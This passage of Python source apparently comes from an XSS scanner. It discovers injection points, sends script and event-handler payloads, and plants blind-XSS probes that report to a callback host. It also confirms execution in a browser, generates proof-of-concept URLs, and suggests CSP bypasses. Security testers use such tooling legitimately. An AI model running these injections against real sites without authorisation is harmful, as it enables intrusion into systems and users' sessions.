                if self._stop.is_set():
                    return
                await self.test_point(point)
            if self.args.scan_headers:
                await self.test_headers(url)
            if self.args.dom:
                await self.test_dom(url)
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            self.console.debug(f"Error scanning {truncate(url, 120)}: {exc}")
        finally:
            if not self._stop.is_set():
                self.state.mark_scanned(url)
                self.state.save()
                self.stats.urls_done += 1

    async def discover_points(self, url: str) -> List[InjectionPoint]:
        points: List[InjectionPoint] = []
        seen: Set[str] = set()

        def add(point: InjectionPoint) -> None:
            key = point.key()
            if key not in seen:
                seen.add(key)
                points.append(point)

        for name, value in parse_qsl(urlsplit(url).query, keep_blank_values=True):
            add(
                InjectionPoint(
                    url=url,
                    method="GET",
                    param=name,
                    value=value,
                    source="query",
                    page_url=url,
                )
            )

        # OpenAPI request bodies (JSON/form) become injection points too.
        for point in self._api_points(url):
            add(point)
        for name in self._mined_params.get(url, [])[:25]:
            add(
                InjectionPoint(
                    url=url,
                    method="GET",
                    param=name,
                    value="",
                    source="query",
                    page_url=url,
                )
            )

        response = await self.http.get(url, cache=True)
        if response.error or not response.text:
            return points

        # Endpoint fuzzing: discovered endpoints often have no query string, so try a
        # small set of high-signal parameter names instead of only existing ones.
        if (
            getattr(self.args, "fuzz_params", False)
            and not urlsplit(url).query
            and not looks_like_dangerous(url)
        ):
            limit = max(1, int(getattr(self.args, "fuzz_param_limit", 10)))
            candidate_names = list(
                dict.fromkeys([*FUZZ_PARAM_NAMES, *self.discovered_param_names])
            )
            for name in candidate_names[:limit]:
                add(
                    InjectionPoint(
                        url=url,
                        method="GET",
                        param=name,
                        value="",
                        source="query",
                        page_url=url,
                    )
                )

        if not HAS_BS4:
            return points

        content_type = response.header("content-type", "").lower()
        if content_type and "html" not in content_type:
            return points

        soup = _soup(response.text)
        for index, form in enumerate(soup.find_all("form")):
            action, method, fields = parse_form(form, url)
            if not self.scope.in_scope(action):
                continue
            for name, spec in list(fields.items())[:40]:
                add(
                    InjectionPoint(
                        url=action,
                        method=method.upper(),
                        param=name,
                        value=spec.value,
                        source="form",
                        form_index=index,
                        fields=fields,
                        page_url=url,
                    )
                )

        # Links carrying query strings are cheap extra coverage when crawling is off.
        if not self.args.crawl:
            count = 0
            for tag in soup.find_all("a", href=True):
                href = tag.get("href")
                if not isinstance(href, str):
                    continue
                link = urljoin(url, href)
                if "?" not in link or not self.scope.in_scope(link):
                    continue
                if not looks_like_page(link):
                    continue
                for name, value in parse_qsl(urlsplit(link).query, keep_blank_values=True):
                    add(
                        InjectionPoint(
                            url=link,
                            method="GET",
                            param=name,
                            value=value,
                            source="query",
                            page_url=link,
                        )
                    )
                count += 1
                if count >= 25:
                    break

        return points

    def _api_points(self, url: str) -> List[InjectionPoint]:
        """Build body injection points from discovered OpenAPI operations."""
        points: List[InjectionPoint] = []
        if not self.api_operations:
            return points
        target_path = urlsplit(url).path.rstrip("/") or "/"
        for operation in self.api_operations:
            operation_path = urlsplit(operation.url).path.rstrip("/") or "/"
            if operation_path != target_path:
                continue
            content_type = str(getattr(operation, "content_type", "") or "").lower()
            for parameter in getattr(operation, "parameters", []):
                if parameter.location not in ("body", "formData"):
                    continue
                sample = dict(getattr(operation, "sample_body", {}) or {})
                value = str(sample.get(parameter.name, parameter.example))
                method = str(getattr(operation, "method", "POST") or "POST").upper()
                if "json" in content_type:
                    points.append(
                        InjectionPoint(
                            url=operation.url,
                            method=method,
                            param=parameter.name,
                            value=value,
                            source="json",
                            json_body=sample or {parameter.name: value},
                            content_type=operation.content_type or "application/json",
                            page_url=url,
                        )
                    )
                else:
                    fields = {
                        name: FormField(name=name, value=str(item))
                        for name, item in sample.items()
                    } or {
                        parameter.name: FormField(name=parameter.name, value=value)
                    }
                    points.append(
                        InjectionPoint(
                            url=operation.url,
                            method=method,
                            param=parameter.name,
                            value=value,
                            source="form",
                            fields=fields,
                            content_type=operation.content_type,
                            page_url=url,
                        )
                    )
        return points

    # -- injection --------------------------------------------------------------------
    def build_get_url(self, point: InjectionPoint, payload: str) -> str:
        if point.source == "query":
            return replace_query_param(point.url, point.param, payload)
        values = {name: spec.value for name, spec in point.fields.items()}
        values[point.param] = payload
        return merge_query(point.url, values)

    def poc_for_point(self, point: InjectionPoint, payload: str) -> Tuple[str, str]:
        """Reproduction proof for this point (module-level :func:`build_poc`)."""
        return build_poc(point, payload)

    def build_post_data(self, point: InjectionPoint, payload: str) -> Dict[str, str]:
        values = {name: spec.value for name, spec in point.fields.items()}
        values[point.param] = payload
        return values

    async def send_point(self, point: InjectionPoint, payload: str) -> Optional[HttpResponse]:
        method = point.method.upper()
        if point.source == "json":
            body = dict(point.json_body or {})
            body[point.param] = payload
            return await self.http.request(
                method,
                point.url,
                json_body=body,
                headers={"Content-Type": point.content_type or "application/json"},
            )
        if method == "GET":
            return await self.http.get(self.build_get_url(point, payload))
        return await self.http.request(
            method, point.url, data=self.build_post_data(point, payload)
        )

    async def inject_blind(self, point: InjectionPoint) -> None:
        """Send out-of-band payloads to a point, independent of reflection."""
        if (
            (not self.blind_url and self.oob is None)
            or not HAS_ADVANCED
            or build_blind_payloads is None
        ):
            return
        key = point.key()
        if key in self._blind_points:
            return
        self._blind_points.add(key)

        marker = unique_token("b", 10)
        callback = self.blind_url or ""
        registration = None
        if self.oob is not None:
            override = ""
            if self.blind_url:
                separator = "&" if "?" in self.blind_url else "?"
                override = f"{self.blind_url}{separator}m={marker}"
            try:
                registration = self.oob.allocate(
                    marker,
                    point.url,
                    point.param,
                    point.method,
                    callback=override or None,
                )
            except Exception as exc:
                self.console.debug(f"OOB allocation failed: {exc}")
            if registration is not None:
                callback = self.blind_url or registration.callback
                self.stats.oob_registered = len(self.oob.registrations)
                self.state.extra["oob_registered"] = self.stats.oob_registered
        if not callback:
            return

        payloads = build_blind_payloads(callback, marker, "html")
        sent: List[str] = []
        # Script and attribute-breakout variants cover stored HTML and echo
        # contexts with two requests per injection point.
        for item in payloads[:2]:
            payload = self.transform_payload(item.template)
            result = await self.send_point(point, payload)
            self.stats.payloads += 1
            if result is not None and not result.error:
                sent.append(payload)

        if not sent:
            return

        if registration is not None:
            registration.payload = sent[0]

        self.blind_markers.append(
            {
                "marker": marker,
                "url": point.url,
                "parameter": point.param,
                "method": point.method.upper(),
                "callback": callback,
            }
        )
        # Policy: a blind probe is a *probe*, not a finding.  It only becomes a
        # report entry (Blind XSS - callback confirmed) when the out-of-band
        # endpoint actually answers with this marker - a payload being merely
        # "sent" proves nothing about execution or storage.
        self.console.info(
            f"Blind XSS probe deployed: marker {marker} -> {callback} "
            "(finding is raised only if a callback is observed)",
            important=False,
        )

    async def test_point(self, point: InjectionPoint) -> None:
        self.stats.points += 1
        location = f"{point.method} {point.param} @ {truncate(point.url, 110)}"

        # Out-of-band injection does not need a reflection: the payload may be
        # stored and executed later by an admin/back-office view.
        await self.inject_blind(point)

        token = unique_token()
        
        # Use per-character probing if enabled
        if HAS_ADVANCED and getattr(self.args, 'per_char_probe', False):
            from xoxss.analysis.per_char import PerCharProbe, ProbeContext
            probe_engine = PerCharProbe()
            probe = probe_engine.generate_probe_string(token)
            response = await self.send_point(point, probe)
            if response is None or response.error or not response.text:
                self.console.debug(f"No response for {location}")
                return
            
            # Analyze with per-character probe
            probe_analysis = probe_engine.analyze_probe(response.text, token)
            info = analyze_reflection(
                response.text, token, probe, response.header("content-type", "")
            )
            # Use context from per-char analysis if available
            if probe_analysis.detected_context != ProbeContext.UNKNOWN:
                info.context = probe_analysis.detected_context.value
        else:
            probe = self.payloads.probe(token)
            response = await self.send_point(point, probe)
            if response is None or response.error or not response.text:
                self.console.debug(f"No response for {location}")
                return

            info = analyze_reflection(
                response.text, token, probe, response.header("content-type", "")
            )
        
        if not info.reflected:
            self.console.debug(f"Not reflected: {location}")
            return

        self.console.debug(f"Reflected ({info.detail}): {location}")

        # Use polyglot payloads if enabled
        if HAS_ADVANCED and getattr(self.args, 'polyglot', False):
            from xoxss.analysis.polyglot import PolyglotGenerator as PolyglotPayloadGenerator
            polyglot_gen = PolyglotPayloadGenerator()
            polyglots = polyglot_gen.generate_polyglots(token, [info.context], self.args.max_payloads)
            for polyglot in polyglots:
                if self._stop.is_set():
                    return
                payload = self.transform_payload(polyglot.payload)
                result = await self.send_point(point, payload)
                if result is None or result.error or not result.text:
                    continue
                self.stats.payloads += 1
                polyglot_info = analyze_reflection(
                    result.text, token, payload, result.header("content-type", "")
                )
                # Confirm execution with the browser when one is available
                if self.pool is not None and self.pool.engines and self.args.confirm != "http":
                    finding = await self.confirm_in_browser(point, payload, token, polyglot_info)
                    if finding:
                        self.add_finding(finding)
                        return
                if polyglot_info.reflected:
                    if not polyglot_info.executable:
                        self.console.debug(
                            f"Polyglot reflected but not executable ({polyglot_info.context}): {location}"
                        )
                        continue
                    poc_url, poc_command = self.poc_for_point(point, payload)
                    self.add_finding(
                        Finding(
                            kind="Reflected XSS (polyglot)",
                            url=point.url,
                            parameter=point.param,
                            method=point.method.upper(),
                            payload=payload,
                            evidence=f"polyglot payload reflected unescaped and executable "
                            f"({polyglot_info.detail})",
                            confidence="high",
                            context=info.context,
                            detail="Polyglot payload used for efficiency",
                            poc_url=poc_url,
                            poc_command=poc_command,
                        )
                    )
                    return
            if polyglots:
                return
            # No polyglots for this context: fall through to the standard loop
            # so the injection point is never left untested.

        # Standard payload testing
        for template in self.payloads.payloads_for(info.context, self.args.max_payloads):
            if self._stop.is_set():
                return
            payload_token = unique_token()
            payload = self.transform_payload(
                self.payloads.render(template, payload_token, info.context)
            )
            result = await self.send_point(point, payload)
            if result is None or result.error or not result.text:
                continue
            self.stats.payloads += 1
            payload_info = analyze_reflection(
                result.text, payload_token, payload, result.header("content-type", "")
            )
            if not payload_info.reflected:
                continue

            if point.method.upper() == "POST" and self.args.stored and point.key() not in self._stored_checked:
                self._stored_checked.add(point.key())
                stored_page = await self.check_stored(point, payload_token, payload)
                if stored_page:
                    _, stored_poc_command = self.poc_for_point(point, payload)
                    self.add_finding(
                        Finding(
                            kind="Stored XSS (payload persisted)",
                            url=stored_page,
                            parameter=point.param,
                            method="POST",
                            payload=payload,
                            evidence=f"payload persisted and re-rendered on {stored_page}",
                            confidence="high",
                            context=payload_info.context,
                            detail="Persistence verified over HTTP; execution not re-confirmed",
                            poc_url=stored_page,
                            poc_command=stored_poc_command,
                        )
                    )
                    return

            if not payload_info.executable and not self.args.report_reflections:
                self.console.debug(f"Reflected but not executable ({payload_info.context}): {location}")
                continue

            if self.pool is not None and self.pool.engines and self.args.confirm != "http":
                finding = await self.confirm_in_browser(point, payload, payload_token, info)
                if finding:
                    self.add_finding(finding)
                    return

            confidence = "high" if payload_info.executable else "low"
            poc_url, poc_command = self.poc_for_point(point, payload)
            self.add_finding(
                Finding(
                    kind="Reflected XSS (HTTP evidence)",
                    url=point.url,
                    parameter=point.param,
                    method=point.method.upper(),
                    payload=payload,
                    evidence=f"payload reflected unescaped ({payload_info.detail})",
                    confidence=confidence,
                    context=info.context,
                    detail="Browser verification unavailable or inconclusive",
                    poc_url=poc_url,
                    poc_command=poc_command,
                )
            )
            return

    async def confirm_in_browser(
        self,
        point: InjectionPoint,
        payload: str,
        token: str,
        info: ReflectionInfo,
    ) -> Optional[Finding]:
        if self.pool is None:
            return None
        try:
            async with self.pool.borrow() as browser:
                self.stats.browser_checks += 1
                if point.method.upper() == "GET":
                    await browser.navigate(self.build_get_url(point, payload))
                else:
                    await browser.navigate(point.page_url or point.url)
                    submitted = await browser.submit_form(
                        point.form_index if point.form_index is not None else 0,
                        point.param,
                        payload,
                    )
                    self.console.debug(f"Form submit result: {submitted}")

                hit = await browser.check_token(token, timeout=2.5)
                if not hit or hit.get("executed") != "yes":
                    return None

                screenshot = ""
                if self.args.screenshot:
                    target_path = self.screenshot_dir / f"{token}.png"
                    screenshot = await browser.screenshot(str(target_path))

                poc_url, poc_command = self.poc_for_point(point, payload)
                return Finding(
                    kind="Reflected XSS",
                    url=self.build_get_url(point, payload) if point.method.upper() == "GET" else point.url,
                    parameter=point.param,
                    method=point.method.upper(),
                    payload=payload,
                    evidence=hit.get("evidence", ""),
                    confidence="confirmed",
                    context=info.context,
                    detail="JavaScript execution confirmed in browser",
                    screenshot=screenshot,
                    poc_url=poc_url,
                    poc_command=poc_command,
                )
        except Exception as exc:
            self.console.debug(f"Browser confirmation error: {exc}")
            return None

    def add_finding(self, finding: Finding) -> bool:
        key = finding.key()
        if key in self._finding_keys:
            return False
        self._finding_keys.add(key)
        self.findings.append(finding)
        self.stats.findings = len(self.findings)
        self.state.add_finding(finding)
        self.state.save(force=True)
        self.console.event("finding", target=self.target, finding=finding.to_dict())
        self.console.finding(finding)
        return True

    # -- header injection -------------------------------------------------------------
    async def test_headers(self, url: str) -> None:
        candidates = self.args.header_list or [
            "User-Agent",
            "Referer",
            "X-Forwarded-Host",
            "X-Forwarded-For",
            "X-Original-URL",
            "Origin",
        ]
        for header in candidates:
            if self._stop.is_set():
                return
            token = unique_token()
            payload = self.transform_payload(
                self.payloads.render("<script>{m}</script>", token)
            )
            response = await self.http.get(url, headers={header: payload})
            if response.error or not response.text:
                continue
            info = analyze_reflection(
                response.text, token, payload, response.header("content-type", "")
            )
            if not info.reflected or not info.executable:
                if info.reflected and not info.executable:
                    self.console.debug(
                        f"Header {header} reflected but not executable; suppression: "
                        "no finding without executable context"
                    )
                continue
            poc_url, poc_command = self.poc_for_point(
                InjectionPoint(url=url, method="GET", param=header, source="header"), payload
            )
            self.add_finding(
                Finding(
                    kind="Header XSS (reflection)",
                    url=url,
                    parameter=header,
                    method="GET",
                    payload=payload,
                    evidence=f"injected header reflected unescaped and executable ({info.detail})",
                    confidence="medium",
                    context=info.context,
                    detail="Header reflections cannot be browser-verified without a proxy",
                    poc_url=poc_url,
                    poc_command=poc_command,
                )
            )
            return

    # -- DOM XSS ----------------------------------------------------------------------
    def dom_vectors(self, url: str, limit: int = 16) -> List[Tuple[str, str, str]]:
        vectors: List[Tuple[str, str, str]] = []
        templates = [("<img src=x onerror=\"{m}\">", "html"), ("{m}", "js")]
        params = parse_qsl(urlsplit(url).query, keep_blank_values=True)
        for template, kind in templates:
            for name, _value in params[:8]:
                token = unique_token()
                payload = self.payloads.render(template, token)
                vectors.append((replace_query_param(url, name, payload), token, kind))
            token = unique_token()
            payload = self.payloads.render(template, token)
            parts = urlsplit(url)
            vectors.append((urlunsplit((parts.scheme, parts.netloc, parts.path, parts.query, payload)), token, kind))
        return vectors[:limit]

    async def test_dom(self, url: str) -> None:
        response = await self.http.get(url, cache=True)
        if response.error or not response.text or not HAS_BS4:
            return

        scripts = extract_scripts(url, response.text)
        fetched = 0
        for script in scripts:
            if script.inline or fetched >= 12 or self._stop.is_set():
                continue
            if not self.scope.in_scope(script.url):
                continue
            remote = await self.http.get(script.url, cache=True)
            if remote.ok and remote.text:
                script.content = remote.text
                fetched += 1

        if HAS_RECON and analyze_js_taint is not None:
            for script in scripts:
                if not script.content:
                    continue
                try:
                    flows = analyze_js_taint(script.content, script.url or url)
                except Exception as exc:
                    self.console.debug(f"AST taint analysis failed: {exc}")
                    continue
                self.stats.ast_flows += len(flows)
                for flow in flows:
                    self._record_taint_flow(script.url or url, flow)

        candidates = static_dom_candidates(scripts)
        inline_sink = any(has_dom_sink(script.content) for script in scripts if script.content)

        # --postmessage / --websocket: analyze inline scripts for sink handlers
        if scripts and (self.args.postmessage or self.args.websocket):
            from xoxss.analysis.postmessage import PostMessageAnalyzer
            from xoxss.analysis.websocket import WebSocketAnalyzer
            marker = unique_token()
            for script in scripts:
                if not script.content or self._stop.is_set():
                    continue
                if self.args.postmessage:
                    try:
                        for vuln in PostMessageAnalyzer().analyze_postmessage_handlers(
                            script.content, marker
                        ):
                            self.postmessage_findings.append({
                                'url': script.url or url,
                                'sink': vuln.sink_type.value,
                                'origin_validated': vuln.has_origin_validation,
                                'description': vuln.description,
                            })
                    except Exception as exc:
                        self.console.debug(f"postMessage analysis failed: {exc}")
                if self.args.websocket:
                    try:
                        for vuln in WebSocketAnalyzer().analyze_websocket_handlers(
                            script.content, marker
                        ):
                            self.websocket_findings.append({
                                'url': script.url or url,
                                'sink': vuln.sink_type.value,
                                'location': vuln.location[:160],
                                'description': vuln.description,
                            })
                    except Exception as exc:
                        self.console.debug(f"WebSocket analysis failed: {exc}")
            if self.postmessage_findings or self.websocket_findings:
                self.console.debug(
                    f"postMessage/WebSocket sinks on {url}: "
                    f"{len(self.postmessage_findings)} pm, {len(self.websocket_findings)} ws"
                )

        # --dom-clobbering: static check on the page markup
        if self.args.dom_clobbering and response.text:
            from xoxss.analysis.dom_clobbering import DOMClobberingDetector
            try:
                for vuln in DOMClobberingDetector().detect_dom_clobbering(response.text, url):
                    self.dom_clobber_findings.append({
                        'url': url,
                        'type': vuln.clobbering_type.value,
                        'property': vuln.target_property,
                        'element': vuln.element[:120],
                        'severity': vuln.severity,
                    })
                    self.console.warn(
                        f"DOM clobbering ({vuln.clobbering_type.value}): "
                        f"{vuln.target_property} @ {truncate(url, 90)}"
                    )
            except Exception as exc:
                self.console.debug(f"DOM clobbering analysis failed: {exc}")

        # --file-upload: look for upload forms so the operator gets an endpoint list
        if self.args.file_upload and response.text:
            from xoxss.analysis.file_upload import FileUploadAnalyzer
            try:
                if FileUploadAnalyzer().detect_file_upload_endpoint(response.text):
                    self.file_upload_findings.append({'url': url})
                    self.console.info(f"File upload form found: {url}", important=False)
            except Exception as exc:
                self.console.debug(f"File upload analysis failed: {exc}")

        if candidates:
            self.console.debug(
                f"DOM source/sink candidates on {url}: "
                + "; ".join(f"{c['source']} -> {c['sink']}" for c in candidates[:4])
            )
            if self.args.report_reflections:
                for candidate in candidates[:3]:
                    self.add_finding(
                        Finding(
                            kind="DOM XSS (static candidate)",
                            url=url,
                            parameter="N/A",
                            method="GET",
                            payload=candidate.get("snippet", ""),
                            evidence=f"{candidate['source']} flows into {candidate['sink']}",
                            confidence="low",
                            context="dom",
                            detail=f"script: {candidate.get('script', '')}",
                        )
                    )

        if not candidates and not inline_sink:
            return
        if self.pool is None or not self.pool.engines:
            if candidates:
                self.console.info(f"DOM sinks present on {url} - install Selenium to verify at runtime", important=False)
            return

        for vector, token, kind in self.dom_vectors(url)[: self.args.max_payloads * 3]:
            if self._stop.is_set():
                return
            try:
                async with self.pool.borrow() as browser:
                    self.stats.browser_checks += 1
                    await browser.navigate(vector)
                    hit = await browser.check_token(token, timeout=2.0)
                    if not hit:
                        continue
                    executed = hit.get("executed") == "yes"
                    screenshot = ""
                    if self.args.screenshot:
                        screenshot = await browser.screenshot(
                            str(self.screenshot_dir / f"dom-{token}.png")
                        )
                    self.add_finding(
                        Finding(
                            kind="DOM XSS (runtime sink)" if executed else "DOM XSS (sink taint)",
                            url=vector,
                            parameter="fragment" if kind == "js" else "query/fragment",
                            method="GET",
                            payload=payload_for_kind(kind),
                            evidence=hit.get("evidence", ""),
                            confidence="confirmed" if executed else "low",
                            context=f"dom/{kind}",
                            detail=(
                                "Attacker-controlled data reached an instrumented DOM sink and executed"
                                if executed
                                else "Attacker-controlled data reached a DOM sink; execution not confirmed"
                            ),
                            screenshot=screenshot,
                            poc_url=vector,
                        )
                    )
                    return
            except Exception as exc:
                self.console.debug(f"DOM verification error: {exc}")
                return

    # -- stored XSS -------------------------------------------------------------------
    # -- Advanced feature methods (Phase 1 & 2) ----------------------------------------
    async def _test_jsonp(self, url: str) -> None:
        """Test URL for JSONP XSS vulnerabilities."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.jsonp import JSONPAnalyzer as JSONPDetector
        
        detector = JSONPDetector()
        response = await self.http.get(url, cache=True)
        if response.error or not response.text:
            return

        endpoints = detector.discover_jsonp_endpoints(url, response.text, response.header("content-type", ""))
        for endpoint in endpoints:
            self.console.debug(f"JSONP endpoint found: {endpoint.url}")
            if not endpoint.callback_param or endpoint.callback_param == "inferred":
                continue  # cannot inject into an inferred callback name

            # Active same-origin test: replace the callback parameter with a
            # script payload and check whether it is reflected unescaped.
            marker = unique_token()
            payload = f"<script>alert('{marker}')</script>"
            try:
                parts = urlsplit(endpoint.url)
                query = parse_qsl(parts.query, keep_blank_values=True)
            except ValueError:
                continue
            query = [(k, payload if k == endpoint.callback_param else v) for k, v in query]
            if not any(k == endpoint.callback_param for k, _ in query):
                query.append((endpoint.callback_param, payload))
            test_url = urlunsplit(parts._replace(query=urlencode(query)))

            result = await self.http.get(test_url)
            if result.error or not result.text:
                continue
            # Strict evidence policy: the callback must be injected into an
            # actual JavaScript response (a real JSONP endpoint), never into an
            # HTML page that merely echoes the query string back.
            content_type = (result.header("content-type", "") or "").lower()
            if "javascript" not in content_type:
                self.console.debug(
                    f"JSONP candidate {endpoint.url} reflected into non-JS content-type "
                    f"({content_type or 'none'}); skipping"
                )
                continue
            # Raw payload present (not HTML-escaped and not URL-encoded)
            if payload in result.text and f"&lt;" not in result.text[: result.text.find(payload) + len(payload) + 64]:
                self.jsonp_findings.append({
                    'url': endpoint.url,
                    'callback_param': endpoint.callback_param,
                    'evidence': f"callback parameter reflected unescaped with {payload[:48]}",
                    'poc_url': test_url,
                })
                self.console.warn(f"JSONP XSS found: {endpoint.url} - {endpoint.callback_param}")
    
    async def _analyze_csp(self, url: str) -> None:
        """Analyze CSP headers for bypass opportunities."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.csp import CSPAnalyzer
        
        analyzer = CSPAnalyzer()
        response = await self.http.get(url, cache=True)
        if response.error:
            return
        
        # Extract CSP header
        csp_header = response.header("content-security-policy", "")
        if not csp_header:
            return
        
        analysis = analyzer.analyze_csp(csp_header)
        if analysis.bypass_possible:
            self.csp_issues.append({
                'url': url,
                'csp': csp_header,
                'issues': [f"{i.issue_type}: {i.description}" for i in analysis.issues],
            })
            self.console.warn(f"CSP bypass possible: {url}")
            
            # Suggest bypass payloads
            marker = unique_token()
            bypasses = analyzer.suggest_bypass_payloads(analysis, marker)
            for bypass in bypasses:
                self.console.debug(f"CSP bypass suggestion: {bypass[:60]}...")

        # Trusted Types directive audit (--trusted-types)
        if getattr(self.args, "trusted_types", False):
            from xoxss.analysis.trusted_types import TrustedTypesAnalyzer
            tt_analysis = TrustedTypesAnalyzer().analyze_trusted_types(csp_header)
            if tt_analysis.issues:
                self.trusted_types_issues.append({
                    'url': url,
                    'issues': [
                        f"{issue.issue_type} ({issue.severity}): {issue.description}"
                        for issue in tt_analysis.issues
                    ],
                })
                self.console.debug(f"Trusted Types audit: {len(tt_analysis.issues)} issue(s) on {url}")

    def _analyze_graphql(self, url: str, body: str, content_type: str) -> None:
        """Detect GraphQL endpoints and flag open introspection (--graphql)."""
        if not HAS_ADVANCED or not getattr(self.args, "graphql", False):
            return
        path = urlsplit(url).path.rstrip("/").lower()
        if ("application/json" not in content_type
                and not path.endswith(("graphql", "graphiql", "api/graphql"))):
            return
        from xoxss.analysis.graphql import GraphQLAnalyzer

        analyzer = GraphQLAnalyzer()
        try:
            if not analyzer.detect_graphql_endpoint(url, body):
                return
        except Exception as exc:
            self.console.debug(f"GraphQL detection failed for {url}: {exc}")
            return
        if any(item.get("url") == url for item in self.graphql_endpoints):
            return
        introspection_open = False
        try:
            introspection_open = analyzer.check_introspection(body)
        except Exception:
            pass
        self.graphql_endpoints.append({
            'url': url,
            'introspection': introspection_open,
        })
        if introspection_open:
            self.console.warn(f"GraphQL introspection enabled: {url}")
        else:
            self.console.info(f"GraphQL endpoint found: {url}", important=False)
    
    async def _analyze_cors(self, url: str) -> None:
        """Analyze CORS headers for misconfigurations."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.cors import CORSAnalyzer
        
        analyzer = CORSAnalyzer()
        response = await self.http.get(url, cache=True)
        if response.error:
            return
        
        # Extract CORS headers
        cors_headers = {}
        for header, value in response.headers.items():
            if 'access-control' in header.lower():
                cors_headers[header] = value
        
        if not cors_headers:
            return
        
        analysis = analyzer.analyze_cors(cors_headers)
        if analysis.is_misconfigured:
            self.cors_issues.append({
                'url': url,
                'issues': [f"{i.issue_type}: {i.description}" for i in analysis.issues],
            })
            self.console.warn(f"CORS misconfiguration: {url}")
            
            # Check XSS exfiltration risk
            if analyzer.check_xss_data_exfiltration_risk(analysis):
                self.console.warn(f"  XSS data exfiltration possible via CORS")
    
    async def _detect_mxss(self, url: str, js_content: str) -> None:
        """Detect mutation XSS vulnerabilities."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.mxss import MXSSDetector
        
        detector = MXSSDetector()
        analysis = detector.detect_mutation_xss(js_content, url)
        
        if analysis.has_mutation_xss:
            self.mxss_findings.append({
                'url': url,
                'sanitizer': analysis.sanitizer or 'unknown',
                'version': analysis.version or 'unknown',
                'vulnerable': analysis.vulnerable,
                'contexts': analysis.contexts,
            })
            self.console.warn(f"Mutation XSS possible: {url} - {analysis.sanitizer} {analysis.version}")
            
            # Generate test payloads
            marker = unique_token()
            payloads = detector.generate_test_payloads(analysis, marker)
            for payload in payloads[:3]:
                self.console.debug(f"mXSS test payload: {payload[:80]}...")
    
    async def _detect_proto_pollution(self, url: str, js_content: str) -> None:
        """Detect prototype pollution vulnerabilities."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.proto_pollution import PrototypePollutionDetector
        
        detector = PrototypePollutionDetector()
        analysis = detector.detect_prototype_pollution(js_content, url)
        
        if analysis.has_pollution_sources:
            if not any(item.get("url") == url for item in self.proto_pollution_findings):
                self.proto_pollution_findings.append({
                    'url': url,
                    'frameworks': analysis.frameworks,
                    'pollution_sources': [source.value for source in analysis.pollution_sources],
                    'has_gadget_chains': analysis.has_gadget_chains,
                })
                self.console.warn(f"Prototype pollution sources found: {url}")
            self.console.debug(
                "Proto hints: "
                + ", ".join(source.value for source in analysis.pollution_sources)
                + " | frameworks: "
                + (", ".join(analysis.frameworks) or "none")
            )
    
    # -- stored XSS -------------------------------------------------------------------
    async def check_stored(self, point: InjectionPoint, token: str, payload: str) -> Optional[str]:
        if not self.args.stored:
            return None
        candidates: List[str] = []
        if point.page_url:
            candidates.append(point.page_url)
        candidates.extend(self.state.extra.get("discovered", [])[: self.args.stored_pages])
        candidates.extend(sorted(self.state.scanned)[: self.args.stored_pages])
        seen: Set[str] = set()
        for page in candidates[: self.args.stored_pages]:
            normalized = normalize_url(page)
            if normalized in seen:
                continue
            seen.add(normalized)
            response = await self.http.get(page, cache=False)
            if response.error or not response.text:
                continue
            if token in response.text or payload in response.text:
                return page
        return None

    # -- summary ----------------------------------------------------------------------
    def print_summary(self) -> None:
        if self.console.quiet:
            return
        stats = self.stats
        self.console.raw("")
        self.console.rule("scan summary")
        self.console.raw("")
        rows = [
            ("Target", self.target),
            ("Duration", fmt_duration(stats.elapsed)),
            ("URLs scanned", f"{stats.urls_done}/{stats.urls_total}"),
            ("Endpoints", str(len(self.endpoints))),
            ("Subdomains", str(stats.subdomains)),
            ("Passive URLs", str(stats.passive_urls)),
            ("JS files / secrets", f"{stats.js_files} / {stats.secrets}"),
            ("AST taint flows", str(stats.ast_flows)),
            ("OOB markers / hits", f"{stats.oob_registered} / {stats.oob_hits}"),
            ("External findings", str(stats.external_findings)),
            ("Injection points", str(stats.points)),
            ("Payloads sent", str(stats.payloads)),
            ("HTTP requests", str(stats.requests)),
            ("HTTP errors", str(stats.errors)),
            ("Truncated responses", str(stats.truncated_responses)),
            ("Browser checks", str(stats.browser_checks)),
            ("WAF", self.waf.label()),
            ("Vulnerable libs", str(len(self.vulnerable_libs))),
            ("JSONP findings", str(len(self.jsonp_findings))),
            ("CSP issues", str(len(self.csp_issues))),
            ("CORS issues", str(len(self.cors_issues))),
            ("Trusted Types issues", str(len(self.trusted_types_issues))),
            ("DOM clobbering", str(len(self.dom_clobber_findings))),
            ("postMessage sinks", str(len(self.postmessage_findings))),
            ("WebSocket sinks", str(len(self.websocket_findings))),
            ("File upload forms", str(len(self.file_upload_findings))),
            ("GraphQL endpoints", str(len(self.graphql_endpoints))),
            ("Findings", str(len(self.findings))),
            ("State file", str(self.state.path) if self.state.enabled else "disabled"),
        ]
        width = max(len(label) for label, _ in rows)
        waf_label = self.waf.label().lower()
        for label, value in rows:
            value_style = ""
            if label == "Findings":
                value_style = f"{bcolors.FAIL}{bcolors.BOLD}" if self.findings else bcolors.GREY
            elif label == "WAF" and waf_label not in ("none", "not detected"):
                value_style = bcolors.WARNING
            elif label == "Duration":
                value_style = bcolors.ENDC
            self.console.raw(
                f"  {bcolors.DIM}{label.rjust(width)}{bcolors.ENDC}  "
                f"{value_style}{value}{bcolors.ENDC}"
            )

        if self.findings:
            self.console.raw(
                f"  {bcolors.FAIL}{bcolors.BOLD}\u00bb {len(self.findings)} XSS finding(s) - "
                f"triage the JSON/SARIF reports for full evidence{bcolors.ENDC}"
            )
        else:
            self.console.raw(
                f"  {bcolors.GREY}\u00bb no confirmed XSS findings in this pass "
                f"(consider blind-XSS coverage){bcolors.ENDC}"
            )

        if self.vulnerable_libs:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}Vulnerable JavaScript libraries{bcolors.ENDC}")
            for vuln in self.vulnerable_libs:
                colour = {
                    "high": bcolors.FAIL,
                    "medium": bcolors.WARNING,
                    "low": bcolors.GREY,
                }.get(vuln.severity, bcolors.ENDC)
                self.console.raw(
                    f"  {colour}[{vuln.severity}]{bcolors.ENDC} {vuln.name} {vuln.version} - {vuln.cve}"
                )
                self.console.raw(f"      {truncate(vuln.url, 160)}")

        if self.jsonp_findings:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}JSONP XSS findings{bcolors.ENDC}")
            for finding in self.jsonp_findings[:5]:
                self.console.raw(f"  URL: {truncate(finding['url'], 120)}")
                self.console.raw(f"  Callback: {finding['callback_param']}")

